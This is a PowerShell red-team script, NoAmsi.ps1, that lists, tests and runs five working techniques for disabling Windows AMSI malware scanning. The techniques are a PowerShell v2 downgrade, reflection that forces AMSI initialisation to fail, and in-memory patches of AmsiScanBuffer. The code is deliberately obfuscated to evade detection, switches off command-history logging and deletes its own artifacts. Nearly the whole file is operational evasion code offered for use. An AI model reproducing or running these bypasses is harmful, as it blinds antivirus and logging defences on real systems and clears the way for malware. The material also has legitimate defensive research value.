﻿<#
.SYNOPSIS
   Test AMS1 string bypasses or simple execute one bypass technic!
  
   Author: r00t-3xp10it
   Tested Under: Windows 10 (19042) x64 bits
   Required Dependencies: none
   Optional Dependencies: none
   PS cmdlet Dev version: v2.3.8
   
.DESCRIPTION
   This cmdlet tests an internal list of amsi_bypass_technics on
   current shell or simple executes one of the bypass technics.
   This cmdlet re-uses: @_RastaMouse, @Mattifestation and @nullbyte
   source code POC's obfuscated {by me} to evade string\runtime detection.
   
.NOTES
   _Remark: The Amsi_bypasses will only work on current shell while is
   process is running. But on process close all will return to default.
   _Remark: If sellected -Action '<testall>' then this cmdlet will try
   all available bypasses and aborts at the first successfull bypass.

.Parameter Action
   Accepts arguments: list, testall, bypass (default: bypass)

.Parameter Id
  The technic Id to use for amsi_bypass (default: 2)
   
.EXAMPLE
   PS C:\> Get-Help .\NoAmsi.ps1 -full
   Access this cmdlet comment based help   

.EXAMPLE
   PS C:\> .\NoAmsi.ps1 -Action List
   List ALL cmdlet Amsi_bypasses available!

.EXAMPLE
   PS C:\> .\NoAmsi.ps1 -Action TestAll
   Test ALL cmdlet Amsi_bypasses technics!

.EXAMPLE
   PS C:\> .\NoAmsi.ps1 -Action Bypass -Id 2
   Execute Amsi_bypass technic nº2 on current shell!

.INPUTS
   None. You cannot pipe objects into NoAmsi.ps1

.OUTPUTS
   Testing amsi_bypass technics
   ----------------------------
   Id          : 1
   bypass      : available
   Disclosure  : @nullbyte
   Description : PS_DOWNGRADE_ATTACK
   POC         : powershell -version 2 -C Get-Host
   Remark      : Manual Execute 'powershell -version 2'

   Id          : 2
   bypass      : success
   Disclosure  : @mattifestation
   Description : DLL_REFLECTION
   POC         : ----
   Remark      : string detection successfully disabled

   Id          : 3
   bypass      : success
   Disclosure  : @mattifestation
   Description : FORCE_AMSI_ERROR
   POC         : ----
   Remark      : string detection successfully disabled 
   
   Id          : 4
   bypass      : success
   Disclosure  : @_RastaMouse
   Description : AMSI_RESULT_CLEAN
   POC         : ----
   Remark      : string detection successfully disabled

   Id          : 5
   bypass      : success
   Disclosure  : @am0nsec
   Description : AMSI_SCANBUFFER_PATCH
   POC         : ----
   Remark      : string detection successfully disabled 

.LINK
   https://github.com/r00t-3xp10it/redpill
   https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell   
   https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods
#>


## Non-Positional cmdlet named parameters
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$Action="Bypass",
   [int]$Id='2'
)


$viriato='0'#Redpill Conf
$CmdletVersion = "v2.3.8"
## Global cmdlet variable declarations
$ErrorActionPreference = "SilentlyContinue"
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$host.UI.RawUI.WindowTitle = "@NoAmsi $CmdletVersion {SSA@RedTeam}"

If($Action -iNotMatch '^(List|TestAll|Bypass)$')
{
   ## cmdlet mandatory parameter arguments checker!
   Write-Host "[error] This cmdlet requires -Action '<argument>' parameter!" -ForegroundColor Red -BackgroundColor Black
   Write-Host "";Start-Sleep -Seconds 2;Get-Help .\NoAmsi.ps1 -Examples;exit ## @NoAmsi 
}


#String_POC_Obfuscation
$IoStream = "am@s£+"+"ut@+l£s" -Join ''
$JPGformat = $IoStream.Replace("@","").Replace("£","").Replace("+","i")

## Create Data Table for outputs
$mytable = New-Object System.Data.DataTable
$mytable.Columns.Add("Id")|Out-Null
$mytable.Columns.Add("bypass")|Out-Null
$mytable.Columns.Add("Disclosure")|Out-Null
$mytable.Columns.Add("Description")|Out-Null
$mytable.Columns.Add("POC")|Out-Null
$mytable.Columns.Add("Report")|Out-Null


If($Action -ieq "List")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - List ALL cmdlet bypasses available!
   #>

   Write-Host "`n`nId Disclosure       Description            Requirements" -ForegroundColor Green
   Write-Host "-- ----------       -----------            ------------"
   Write-Host "1  @nullbyte        PS_DOW`NGRADE_ATT`ACK    PS_version2"
   Write-Host "2  @mattifestation  DL`L_REFL`ECTION         None"
   Write-Host "3  @mattifestation  FOR`CE_AM`SI_ERROR       None"
   Write-Host "4  @_RastaMouse     AMS`I_RESULT_CLEAN      Win32_API"
   Write-Host "5  @am0nsec         AM`SI_SCA`NBUFF`ER_PATCH  Win32_API`n"
   Write-Host "* Syntax Examples:" -ForegroundColor Yellow
   If($viriato -eq "0")
   {
      Write-Host "   PS C:\> .\NoAmsi.ps1 -Action testall"
      Write-Host "   PS C:\> .\NoAmsi.ps1 -Action bypass -Id 2`n`n" 
   }
   Else
   {
      Write-Host "   PS C:\> .\redpill.ps1 -NoAmsi testall"
      Write-Host "   PS C:\> .\redpill.ps1 -NoAmsi bypass -Id 2`n`n"  
   }
   exit ## Exit @NoAmsi
}


If($Action -ieq "Bypass")
{

   Write-Host "`n`nExecute am`si_bypass technic nº$Id" -ForegroundColor Green
   Write-Host "--------------------------------"

   If($Id -eq 0 -or $Id -gt 5)
   {
      ## cmdlet mandatory requirements! {ams1 bypass technic number}
      Write-Host "[error] This cmdlet only accepts IDs: { 1, 2, 3, 4, 5 }" -ForegroundColor Red -BackgroundColor Black
      Write-Host "";Start-Sleep -Seconds 2;.\NoAmsi.ps1 -Action List;exit  
   }


   If($Id -eq 1)
   {

      <#
      .SYNOPSIS
         Author: @r00t-3xp10it
         Disclosure: @nullbyte
         Helper - PS_DOWN`GRADE_ATT`ACK!

      .NOTES
         This function uses powershell version 2 to create testme.log
         on %tmp% directory. Then NoAmsi cmdlet will check for bypass
         by checking if the logfile as successfull created on %tmp%
      #>

      try{

         Start-Process -WindowStyle Hidden powershell.exe -ArgumentList "-version 2 -C Get-Host > $Env:TMP\testme.log" -Wait
         If(Test-Path -Path "$Env:TMP\testme.log" -ErrorAction SilentlyContinue)
         {
            ## Make sure version 2.0 its available before go any further!
            $PS2version = Get-Content -Path "$Env:TMP\testme.log" | Where-Object { $_ -Match ': 2.0' }
            If(-not($PS2version))
            {
               Write-Host "[error] powershell -version 2 not found in $Env:COMPUTERNAME system!" -ForegroundColor Red -BackgroundColor Black
               Write-Host "";Start-Sleep -Seconds 2;exit ## Exit @NoAmsi
            }

            ## add results to table
            $mytable.Rows.Add("1",
                              "available",
                              "@nullbyte",
                              "PS_DOWNG`RADE_ATT`ACK",
                              "powershell -version 2 -C Get-Host",
                              "Manual Execute 'powershell -version 2'")|Out-Null
            #Display Output Table
            $mytable|Format-List > $env:TMP\tbl.log
            Get-Content -Path "$env:TMP\tbl.log"|Select-Object -Skip 2
            #Delete artifact {logfile} left behind!
            Remove-Item -Path "$Env:TMP\tbl.log" -Force
            Remove-Item -Path "$Env:TMP\testme.log" -Force
         }
         Else
         {
            Write-Host "[ID:$Id] fail to execute PS_DOWNG`RADE_ATT`ACK technic!" -ForegroundColor Red -BackgroundColor Black         
         }

      }catch{
         Write-Host "[ID:$Id] fail to execute PS_DOWNG`RADE_ATT`ACK technic!" -ForegroundColor Red -BackgroundColor Black
      }

   }
   ElseIf($Id -eq 2)
   {

      <#
      .SYNOPSIS
         Author: @r00t-3xp10it
         Disclosure: @mattifestation
         Helper - DL`L_REFLE`CTION!
      #>

      try{

         $MsTeamsId = "4456625220575263174452554847"
         $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
         $Drawing = "Sy@ste£.M@ana"+"ge£e@nt" + ".Auto@£ati@on."+"A£s@i"+"U@ti@ls" -Join ''
         $Graphics = [string](0..13|%{[char][int](53+($MsTeamsId).substring(($_*2),2))}) -Replace ' '
         $imgForm = $Drawing.Replace("@","").Replace("£","m");$Bitmap = [Ref].Assembly.GetType($imgForm)
         $i0Stream = $Bitmap.GetField($Graphics,"$ComponentDeviceId,Static");$i0Stream.SetValue($null,$true)

         If($?)
         {
            ## add results to table
            $mytable.Rows.Add("2",
                              "success",
                              "@mattifestation",
                              "DL`L_REFL`ECTI`ON",
                              "`"$JPGformat`"",
                              "string detection bypassed!")|Out-Null
            #Display Output Table
            $mytable|Format-List > $env:TMP\tbl.log
            Get-Content -Path "$Env:TMP\tbl.log"|Select-Object -Skip 2
            #Delete artifacts left behind
            Remove-Item -Path "$Env:TMP\tbl.log" -Force

## POC display
$POCTable = @"
`$MsTeamsId = "4456625220575263174452554847"
`$ComponentDeviceId = "N``onP" + "ubl``ic" -join ''
`$Drawing = "Sy@ste£.M@ana"+"ge£e@nt" + ".Auto@£ati@on."+"A£s@i"+"U@ti@ls" -Join ''
`$Graphics = [string](0..13|%{[char][int](53+(`$MsTeamsId).substring((`$_*2),2))}) -Replace ' '
`$imgForm = `$Drawing.Replace("@","").Replace("£","m");`$Bitmap = [Ref].Assembly.GetType(`$imgForm)
`$i0Stream = `$Bitmap.GetField(`$Graphics,"`$ComponentDeviceId,Static");`$i0Stream.SetValue(`$null,`$true)
"@;
         Write-Host "Proof Of Concept" -ForegroundColor Yellow
         Write-Host "-------------------------------------------"
         Write-Host "$POCTable`n`n"

         }

      }catch{
         Write-Host "[ID:$Id] fail to execute DL`L_REFLE`CTION bypass technic!" -ForegroundColor Red -BackgroundColor Black
      }

   }
   ElseIf($Id -eq 3)
   {

      <#
      .SYNOPSIS
         Author: @r00t-3xp10it
         Disclosure: @mattifestation
         Helper - FORCE_AM`SI_ERROR!
      #>

      try{

         $Xdatabase = 'Utils';$Homedrive = 'si'
         $DiskMgr = "Syst+@.M£n£g"+"e@+nt.Auto@"+"£tion.A" -join ''
         $fdx = "@ms"+"£In£"+"tF@£"+"l+d" -Join '';Start-Sleep -Milliseconds 300
         $CleanUp = $DiskMgr.Replace("@","m").Replace("£","a").Replace("+","e")
         $Rawdata = $fdx.Replace("@","a").Replace("£","i").Replace("+","e")
         $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
         $Spotfix = $SDcleanup.GetField(($Rawdata),'NonPublic,Static')
         $Spotfix.SetValue($null,$true)

         If($?)
         {
            ## add results to table
            $mytable.Rows.Add("3",
                              "success",
                              "@mattifestation",
                              "FORCE_AM`SI_ERROR",
                              "`"$JPGformat`"",
                              "string detection bypassed!")|Out-Null
            #Display Output Table
            $mytable|Format-List > $env:TMP\tbl.log
            Get-Content -Path "$Env:TMP\tbl.log"|Select-Object -Skip 2
            #Delete artifacts left behind
            Remove-Item -Path "$Env:TMP\tbl.log" -Force

## POC display
$POCTable = @"
`$Xdatabase = 'Utils';`$Homedrive = 'si'
`$DiskMgr = "Syst+@.M£n£g"+"e@+nt.Auto@"+"£tion.A" -join ''
`$fdx = "@ms"+"£In£"+"tF@£"+"l+d" -Join '';Start-Sleep -Milliseconds 300
`$CleanUp = `$DiskMgr.Replace("@","m").Replace("£","a").Replace("+","e")
`$Rawdata = `$fdx.Replace("@","a").Replace("£","i").Replace("+","e")
`$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f `$CleanUp,`$Homedrive,`$Xdatabase))
`$Spotfix = `$SDcleanup.GetField((`$Rawdata),'NonPublic,Static')
`$Spotfix.SetValue(`$null,`$true)
"@;
         Write-Host "Proof Of Concept" -ForegroundColor Yellow
         Write-Host "-------------------------------------------"
         Write-Host "$POCTable`n`n"

         }

      }catch{
         Write-Host "[ID:$Id] fail to execute FORCE_AM`SI_ERROR bypass technic!" -ForegroundColor Red -BackgroundColor Black
      }

   }
   ElseIf($Id -eq 4)
   {

      <#
      .SYNOPSIS
         Author: @r00t-3xp10it
         Disclosure: @_RastaMouse
         Helper - AM`SI_RES`ULT_CLEAN!
      #>

      try{

         $p = 0
         $Win32 = @"
            using System;
            using System.Runtime.InteropServices;

            public class Win32 {
               [DllImport("kernel32")]
               public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

               [DllImport("kernel32")]
               public static extern IntPtr LoadLibrary(string name);

               [DllImport("kernel32")]
               public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
            }
"@

         Add-Type $Win32
         #Add_Assembly_InteropServices
         $test = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
         $LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($test))
         $test2 = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
         $Address = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($test2))

         [Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p);Start-Sleep -Milliseconds 670
         $Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
         [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)

         If($?)
         {
            ## add results to table
            $mytable.Rows.Add("4",
                              "success",
                              "@_RastaMouse",
                              "AM`SI_RES`ULT_CLEAN",
                              "`"$JPGformat`"",
                              "string detection bypassed!")|Out-Null
            #Display Output Table
            $mytable|Format-List > $env:TMP\tbl.log
            Get-Content -Path "$env:TMP\tbl.log"|Select-Object -Skip 2
            Remove-Item -Path "$Env:TMP\tbl.log" -Force

         Write-Host "Proof Of Concept" -ForegroundColor Yellow
         Write-Host "-------------------------------------------"
         Write-Host "https://gist.github.com/r00t-3xp10it/f414f392ea99cecc3cba1d08abd286b5#gistcomment-3808722`n`n"

         }

      }catch{
         Write-Host "[ID:$Id] fail to execute AM`SI_RESULT_CLEAN bypass technic!" -ForegroundColor Red -BackgroundColor Black
      }

   }
   ElseIf($Id -eq 5)
   {

      <#
      .SYNOPSIS
         Author: @r00t-3xp10it
         Disclosure: @am0nsec
         Helper - AM`SI_SCANBUFF`ER_PATCH!
      #>

      try{

         $Kernel32 = @"
         using System;
         using System.Runtime.InteropServices;

         public class Kernel32 {
            [DllImport("kernel32")]

         public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
            [DllImport("kernel32")]

         public static extern IntPtr LoadLibrary(string lpLibFileName);
            [DllImport("kernel32")]
         public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

         Add-Type $Kernel32
         Class Hunter {
           static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg){
               while($true){
                   [int]$count = 0

                   while($true){
                       [IntPtr]$address = [IntPtr]::Add($address, 1)
                       If([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)){
                           $count++
                           If($count -eq $egg.Length){
                               return [IntPtr]::Subtract($address, $egg.Length - 1)
                           }
                       } Else { break }
                   }
               }

               return $address
           }
       }

       [IntPtr]$hModule = [Kernel32]::LoadLibrary("amsi.dll")
       Write-Host "[+] AMSI DLL Handle: $hModule"

       [IntPtr]$dllCanUnloadNowAddress = [Kernel32]::GetProcAddress($hModule, "DllCanUnloadNow")
       Write-Host "[+] DllCanUnloadNow address: $dllCanUnloadNowAddress"

       If([IntPtr]::Size -eq 8) {
	       Write-Host "[+] System architecture: 64-bits process"
           [byte[]]$egg = [byte[]] (
               0x4C, 0x8B, 0xDC,       # mov     r11,rsp
               0x49, 0x89, 0x5B, 0x08, # mov     qword ptr [r11+8],rbx
               0x49, 0x89, 0x6B, 0x10, # mov     qword ptr [r11+10h],rbp
               0x49, 0x89, 0x73, 0x18, # mov     qword ptr [r11+18h],rsi
               0x57,                   # push    rdi
               0x41, 0x56,             # push    r14
               0x41, 0x57,             # push    r15
               0x48, 0x83, 0xEC, 0x70  # sub     rsp,70h
           )
       } Else {
	       Write-Host "[+] System architecture: 32-bits process"
           [byte[]]$egg = [byte[]] (
               0x8B, 0xFF,             # mov     edi,edi
               0x55,                   # push    ebp
               0x8B, 0xEC,             # mov     ebp,esp
               0x83, 0xEC, 0x18,       # sub     esp,18h
               0x53,                   # push    ebx
               0x56                    # push    esi
           )
       }
       [IntPtr]$targetedAddress = [Hunter]::FindAddress($dllCanUnloadNowAddress, $egg)
       Write-Host "[+] Targeted address: $targetedAddress`n"

       $oldProtectionBuffer = 0
       [Kernel32]::VirtualProtect($targetedAddress, [uint32]2, 4, [ref]$oldProtectionBuffer) | Out-Null

       $patch = [byte[]] (
           0x31, 0xC0,    # xor rax, rax
           0xC3           # ret  
       )
       [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3)

       $a = 0
       [Kernel32]::VirtualProtect($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | Out-Null

         If($?)
         {
            ## add results to table
            $mytable.Rows.Add("2",
                              "success",
                              "@am0nsec",
                              "AM`SI_SCANBUF`FER_PATCH",
                              "`"$JPGformat`"",
                              "string detection bypassed!")|Out-Null
            #Dis play Output Table
            $mytable|Format-List > $env:TMP\tbl.log
            Get-Content -Path "$Env:TMP\tbl.log"|Select-Object -Skip 2
            #Delete artifacts left behind
            Remove-Item -Path "$Env:TMP\tbl.log" -Force

         Write-Host "Proof Of Concept" -ForegroundColor Yellow
         Write-Host "-------------------------------------------"
         Write-Host "https://gist.github.com/r00t-3xp10it/f414f392ea99cecc3cba1d08abd286b5#gistcomment-3808725`n`n"

         }

      }catch{
         Write-Host "[ID:$Id] fail to execute AMS`I_SCANBUF`FER_PATCH bypass technic!" -ForegroundColor Red -BackgroundColor Black
      }

   }

}


If($Action -ieq "TestAll")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Test ALL cmdlet available bypasses!
      
   .NOTES
      This function will stop testing bypass techniques at
      the first command line returned successfull executed.
   #>

   Write-Host "`n`nTesting am`si_bypass technics" -ForegroundColor Green
   Write-Host "----------------------------"

      <#
      .SYNOPSIS
         Author: @r00t-3xp10it
         Disclosure: @nullbyte
         Helper - PS_DOWNG`RADE_ATT`ACK!
      #>

      try{

         Start-Process -WindowStyle Hidden powershell.exe -ArgumentList "-version 2 -C Get-Host > $Env:TMP\testme.log" -Wait
         If(Test-Path -Path "$Env:TMP\testme.log" -ErrorAction SilentlyContinue)
         {
            ## Make sure version 2.0 its available before go any further!
            $PS2version = Get-Content -Path "$Env:TMP\testme.log" | Where-Object { $_ -Match ': 2.0' }
            If(-not($PS2version))
            {
               Write-Host "[error] powershell -version 2 not found in $Env:COMPUTERNAME system!" -ForegroundColor Red -BackgroundColor Black
               Write-Host "";Start-Sleep -Seconds 2;exit ## Exit @NoAmsi
            }

            ## add results to table
            $mytable.Rows.Add("1",
                              "available",
                              "@nullbyte",
                              "PS_DOWNG`RADE_ATT`ACK",
                              "powershell -version 2 -C Get-Host",
                              "Manual Execute 'powershell -version 2'")|Out-Null

            #Delete artifact {logfile} left behind! 
            Remove-Item -Path "$Env:TMP\testme.log" -Force
         }
         Else
         {
            Write-Host "[ID:$Id] fail to execute PS_DOWNG`RADE_ATT`ACK technic!" -ForegroundColor Red -BackgroundColor Black         
         }

      }catch{
         Write-Host "[ID:$Id] fail to execute PS_DOWNG`RADE_ATT`ACK technic!" -ForegroundColor Red -BackgroundColor Black
      }

       <#
      .SYNOPSIS
         Author: @r00t-3xp10it
         Disclosure: @mattifestation
         Helper - DL`L_REFLE`CTION!
      #>

      try{

         $MsTeamsId = "4456625220575263174452554847"
         $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
         $Drawing = "Sy@ste£.M@ana"+"ge£e@nt" + ".Auto@£ati@on."+"A£s@i"+"U@ti@ls" -Join ''
         $Graphics = [string](0..13|%{[char][int](53+($MsTeamsId).substring(($_*2),2))}) -Replace ' '
         $imgForm = $Drawing.Replace("@","").Replace("£","m");$Bitmap = [Ref].Assembly.GetType($imgForm)
         $i0Stream = $Bitmap.GetField($Graphics,"$ComponentDeviceId,Static");$i0Stream.SetValue($null,$true)

         If($?)
         {
            ## add results to table
            $mytable.Rows.Add("2",
                              "success",
                              "@mattifestation",
                              "DL`L_REFL`ECTI`ON",
                              "`"$JPGformat`"",
                              "string detection bypassed!")|Out-Null
            #Display Output Table
            $mytable|Format-List > $env:TMP\tbl.log
            Get-Content -Path "$Env:TMP\tbl.log"|Select-Object -Skip 2
            #Delete artifacts left behind
            Remove-Item -Path "$Env:TMP\tbl.log" -Force

## POC display
$POCTable = @"
`$MsTeamsId = "4456625220575263174452554847"
`$ComponentDeviceId = "N``onP" + "ubl``ic" -join ''
`$Drawing = "Sy@ste£.M@ana"+"ge£e@nt" + ".Auto@£ati@on."+"A£s@i"+"U@ti@ls" -Join ''
`$Graphics = [string](0..13|%{[char][int](53+(`$MsTeamsId).substring((`$_*2),2))}) -Replace ' '
`$imgForm = `$Drawing.Replace("@","").Replace("£","m");`$Bitmap = [Ref].Assembly.GetType(`$imgForm)
`$i0Stream = `$Bitmap.GetField(`$Graphics,"`$ComponentDeviceId,Static");`$i0Stream.SetValue(`$null,`$true)
"@;
         Write-Host "Proof Of Concept" -ForegroundColor Yellow
         Write-Host "-------------------------------------------"
         Write-Host "$POCTable`n`n"
         #success exec = exit
         exit

         }

      }catch{
         Write-Host "[ID:$Id] fail to execute DL`L_REFLE`CTION bypass technic!" -ForegroundColor Red -BackgroundColor Black
      }

      <#
      .SYNOPSIS
         Author: @r00t-3xp10it
         Disclosure: @mattifestation
         Helper - FORCE_AM`SI_ERROR!
      #>

      try{

         $Xdatabase = 'Utils';$Homedrive = 'si'
         $DiskMgr = "Syst+@.M£n£g"+"e@+nt.Auto@"+"£tion.A" -join ''
         $fdx = "@ms"+"£In£"+"tF@£"+"l+d" -Join '';Start-Sleep -Milliseconds 300
         $CleanUp = $DiskMgr.Replace("@","m").Replace("£","a").Replace("+","e")
         $Rawdata = $fdx.Replace("@","a").Replace("£","i").Replace("+","e")
         $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
         $Spotfix = $SDcleanup.GetField(($Rawdata),'NonPublic,Static')
         $Spotfix.SetValue($null,$true)

         If($?)
         {
            ## add results to table
            $mytable.Rows.Add("3",
                              "success",
                              "@mattifestation",
                              "FORCE_AM`SI_ERROR",
                              "`"$JPGformat`"",
                              "string detection bypassed!")|Out-Null
            #Display Output Table
            $mytable|Format-List > $env:TMP\tbl.log
            Get-Content -Path "$Env:TMP\tbl.log"|Select-Object -Skip 2
            #Delete artifacts left behind
            Remove-Item -Path "$Env:TMP\tbl.log" -Force

## POC display
$POCTable = @"
`$Xdatabase = 'Utils';`$Homedrive = 'si'
`$DiskMgr = "Syst+@.M£n£g"+"e@+nt.Auto@"+"£tion.A" -join ''
`$fdx = "@ms"+"£In£"+"tF@£"+"l+d" -Join '';Start-Sleep -Milliseconds 300
`$CleanUp = `$DiskMgr.Replace("@","m").Replace("£","a").Replace("+","e")
`$Rawdata = `$fdx.Replace("@","a").Replace("£","i").Replace("+","e")
`$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f `$CleanUp,`$Homedrive,`$Xdatabase))
`$Spotfix = `$SDcleanup.GetField((`$Rawdata),'NonPublic,Static')
`$Spotfix.SetValue(`$null,`$true)
"@;
         Write-Host "Proof Of Concept" -ForegroundColor Yellow
         Write-Host "-------------------------------------------"
         Write-Host "$POCTable`n`n"
         #success exec = exit
         exit

         }

      }catch{
         Write-Host "[ID:$Id] fail to execute FORCE_AM`SI_ERROR bypass technic!" -ForegroundColor Red -BackgroundColor Black
      }

      <#
      .SYNOPSIS
         Author: @r00t-3xp10it
         Disclosure: @_RastaMouse
         Helper - AM`SI_RES`ULT_CLEAN!
      #>

      try{

         $p = 0
         $Win32 = @"
            using System;
            using System.Runtime.InteropServices;

            public class Win32 {
               [DllImport("kernel32")]
               public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

               [DllImport("kernel32")]
               public static extern IntPtr LoadLibrary(string name);

               [DllImport("kernel32")]
               public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
            }
"@

         Add-Type $Win32
         #Add_Assembly_InteropServices
         $test = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
         $LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($test))
         $test2 = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
         $Address = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($test2))

         [Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p);Start-Sleep -Milliseconds 670
         $Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
         [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)

         If($?)
         {
            ## add results to table
            $mytable.Rows.Add("4",
                              "success",
                              "@_RastaMouse",
                              "AM`SI_RES`ULT_CLEAN",
                              "`"$JPGformat`"",
                              "string detection bypassed!")|Out-Null
            #Display Output Table
            $mytable|Format-List > $env:TMP\tbl.log
            Get-Content -Path "$env:TMP\tbl.log"|Select-Object -Skip 2
            Remove-Item -Path "$Env:TMP\tbl.log" -Force

         Write-Host "Proof Of Concept" -ForegroundColor Yellow
         Write-Host "-------------------------------------------"
         Write-Host "https://gist.github.com/r00t-3xp10it/f414f392ea99cecc3cba1d08abd286b5#gistcomment-3808722`n`n"
         #success exec = exit
         exit

         }

      }catch{
         Write-Host "[ID:$Id] fail to execute AM`SI_RESULT_CLEAN bypass technic!" -ForegroundColor Red -BackgroundColor Black
      }

      <#
      .SYNOPSIS
         Author: @r00t-3xp10it
         Disclosure: @am0nsec
         Helper - AM`SI_SCANBUFF`ER_PATCH!
      #>

      try{

         $Kernel32 = @"
         using System;
         using System.Runtime.InteropServices;

         public class Kernel32 {
            [DllImport("kernel32")]

         public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
            [DllImport("kernel32")]

         public static extern IntPtr LoadLibrary(string lpLibFileName);
            [DllImport("kernel32")]
         public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

         Add-Type $Kernel32
         Class MyHunter {
           static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg){
               while($true){
                   [int]$count = 0

                   while($true){
                       [IntPtr]$address = [IntPtr]::Add($address, 1)
                       If([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)){
                           $count++
                           If($count -eq $egg.Length){
                               return [IntPtr]::Subtract($address, $egg.Length - 1)
                           }
                       } Else { break }
                   }
               }

               return $address
           }
       }

       [IntPtr]$hModule = [Kernel32]::LoadLibrary("amsi.dll")
       Write-Host "[+] AMSI DLL Handle: $hModule"

       [IntPtr]$dllCanUnloadNowAddress = [Kernel32]::GetProcAddress($hModule, "DllCanUnloadNow")
       Write-Host "[+] DllCanUnloadNow address: $dllCanUnloadNowAddress"

       If([IntPtr]::Size -eq 8) {
	       Write-Host "[+] System architecture: 64-bits process"
           [byte[]]$egg = [byte[]] (
               0x4C, 0x8B, 0xDC,       # mov     r11,rsp
               0x49, 0x89, 0x5B, 0x08, # mov     qword ptr [r11+8],rbx
               0x49, 0x89, 0x6B, 0x10, # mov     qword ptr [r11+10h],rbp
               0x49, 0x89, 0x73, 0x18, # mov     qword ptr [r11+18h],rsi
               0x57,                   # push    rdi
               0x41, 0x56,             # push    r14
               0x41, 0x57,             # push    r15
               0x48, 0x83, 0xEC, 0x70  # sub     rsp,70h
           )
       } Else {
	       Write-Host "[+] System architecture: 32-bits process"
           [byte[]]$egg = [byte[]] (
               0x8B, 0xFF,             # mov     edi,edi
               0x55,                   # push    ebp
               0x8B, 0xEC,             # mov     ebp,esp
               0x83, 0xEC, 0x18,       # sub     esp,18h
               0x53,                   # push    ebx
               0x56                    # push    esi
           )
       }
       [IntPtr]$targetedAddress = [MyHunter]::FindAddress($dllCanUnloadNowAddress, $egg)
       Write-Host "[+] Targeted address: $targetedAddress`n"

       $oldProtectionBuffer = 0
       [Kernel32]::VirtualProtect($targetedAddress, [uint32]2, 4, [ref]$oldProtectionBuffer) | Out-Null

       $patch = [byte[]] (
           0x31, 0xC0,    # xor rax, rax
           0xC3           # ret  
       )
       [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3)

       $a = 0
       [Kernel32]::VirtualProtect($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | Out-Null

         If($?)
         {
            ## add results to table
            $mytable.Rows.Add("2",
                              "success",
                              "@am0nsec",
                              "AM`SI_SCANBUFF`ER_PATCH",
                              "`"$JPGformat`"",
                              "string detection bypassed!")|Out-Null
            #Dis play Output Table
            $mytable|Format-List > $env:TMP\tbl.log
            Get-Content -Path "$Env:TMP\tbl.log"|Select-Object -Skip 2
            #Delete artifacts left behind
            Remove-Item -Path "$Env:TMP\tbl.log" -Force

         Write-Host "Proof Of Concept" -ForegroundColor Yellow
         Write-Host "-------------------------------------------"
         Write-Host "https://gist.github.com/r00t-3xp10it/f414f392ea99cecc3cba1d08abd286b5#gistcomment-3808725`n`n"

         }

      }catch{
         Write-Host "[ID:$Id] fail to execute AM`SI_SCANBUFF`ER_PATCH bypass technic!" -ForegroundColor Red -BackgroundColor Black
      }

}